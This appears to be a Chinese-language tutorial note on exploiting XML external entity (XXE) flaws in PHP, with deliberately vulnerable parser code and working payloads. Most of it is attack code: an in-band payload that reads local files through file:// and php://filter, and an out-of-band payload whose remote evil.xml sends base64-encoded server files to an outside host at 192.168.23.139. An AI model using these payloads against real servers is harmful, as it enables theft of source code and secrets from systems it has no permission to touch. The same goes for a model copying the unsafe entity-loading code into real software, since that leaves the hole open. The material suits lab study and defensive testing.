# XXE利用过程

---

- 判断是否存在漏洞

  ```
  http头，观察是否有XML相关字符串
      X-Requested-With: XMLHttpRequest
      Accept: application/xml, text/xml, */*;
  data传输数据，是否解析xml内容
  	<reset><login>bee</login></reset>    
  ```
  
- 有回显漏洞环境(以php为例)

  ```
  <?php
  $data = file_get_contents('php://input');
  $dom = new DOMDocument();
  $dom->loadXML($data);
  print_r($dom);
  ```
  
  

- 有回显利用（以下为文件读取）

  有回显也可以用OOB-XXE，但是没必要，因为效果一样
  
  ```
  data：（xml外部实体bee被赋予值为"file:///d:/robots.txt"，当解析xml文档时，bee会被替换为file:///d:/robots.txt的内容。就被执行回显回来了。）
  
  <?xml version="1.0" encoding="utf-8" ?>
  <!DOCTYPE test[
      <!ENTITY % dtd SYSTEM "file:///d:/robots.txt">
      # <!ENTITY % dtd SYSTEM "php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/php_xxe/doLogin.php"> 
      # 读php文件需要base64转码，不然会直接解析
  ]>
  <reset><login>&dtd;</login></reset>
  
  ```
  
- 无回显漏洞环境(以php为例)

  ```
  <?php
  libxml_disable_entity_loader (true);
  $xmlfile = file_get_contents('php://input');
  $dom = new DOMDocument();
  $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
  ?>
  ```

  

- 无回显利用（这里建议使用python 的http可以记录请求内容，如果使用apache : tail -f /var/log/apache2/access.log 查看日志）

  OOB-XXE:引用远程dtd文件的XXE
  
  ```
<?xml version="1.0"?> 
  <!DOCTYPE test[ 
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/php_xxe/doLogin.php"> # 定义实体file内容为php文件base64编码
  <!ENTITY % dtd SYSTEM "http://192.168.23.139/evil.xml"> # 定义实体dtd内容为xml的内容
  %dtd;  # 执行dtd
  %send; # 执行send
  ]>
  
   
  evil.xml（将内容发送到服务器本地）
  <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.23.139/?content=%file;'>">
  #  定义实体payload内容为dtd的send的定义内容，&#x25;为“%”号
  %payload;  # 执行payload
  ```
  
  